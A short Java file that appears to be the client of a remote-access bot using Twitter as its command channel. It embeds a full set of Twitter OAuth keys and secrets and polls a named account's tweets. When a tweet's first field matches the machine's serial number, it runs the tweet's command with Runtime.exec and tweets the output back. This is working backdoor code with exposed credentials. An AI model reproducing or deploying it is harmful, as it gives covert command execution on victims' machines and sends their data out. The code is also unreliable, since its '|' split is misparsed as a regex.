import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.file.FileStore;
import java.nio.file.FileSystems;
import java.util.List;

import twitter4j.Status;
import twitter4j.Twitter;
import twitter4j.TwitterException;
import twitter4j.TwitterFactory;
import twitter4j.conf.ConfigurationBuilder;

public class tools {
	
	public static void main(String[] args) throws Exception {
		getcommands() ;
		
	}
	public static String getcommands() throws Exception{
		ConfigurationBuilder cb = new ConfigurationBuilder();
		cb.setDebugEnabled(true)
		.setOAuthConsumerKey("kPjjKOnvhn0EmUb0ZIf8Hxds9")
		.setOAuthConsumerSecret("89vPVQ5nbSk5wsopP6BCjSD1gpBGb96JpZH1pefxtbeOTfy6j8")
		.setOAuthAccessToken("735554813233106944-CuamEAV0Mv082lHMZPDoc6sTtNZlfHG")
		.setOAuthAccessTokenSecret("t2YxSnyWheCwT49e6weG59oEicpXZEeHEAZxwiY6wRbAy");
		TwitterFactory tf = new TwitterFactory(cb.build());
		Twitter twitter = tf.getInstance();  
		String screenName="@sadiqi_hamza";
		final List<Status> statuses = twitter.getUserTimeline(screenName);

		for (Status status : statuses) {
		    String st = status.getText() ;
		    
		    String[] st2 = st.split("|") ;
		    if(st2[0].equals(Hardware4Win.getSerialNumber())) {
		    	System.out.println("It's my command ");
		    	
		    	String command =st2[2];
		    	String reponce = runCmd(command) ;
		    	TweetMain.Tweet("REPONCE|"+st2[1]+"|"+reponce);
		    	
		    }
		    
		}
		return "" ;
		
	}
	public static String runCmd(String command) {
        String cmdOutput = "";
        String s = null;
        try {
            Process p = Runtime.getRuntime().exec(command);
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));

            while ((s = stdInput.readLine()) != null) {
                cmdOutput += s+"\n";
            }
        }
        catch (IOException e) {
                e.printStackTrace();
                System.exit(-1);
        }
        return cmdOutput;
}
}
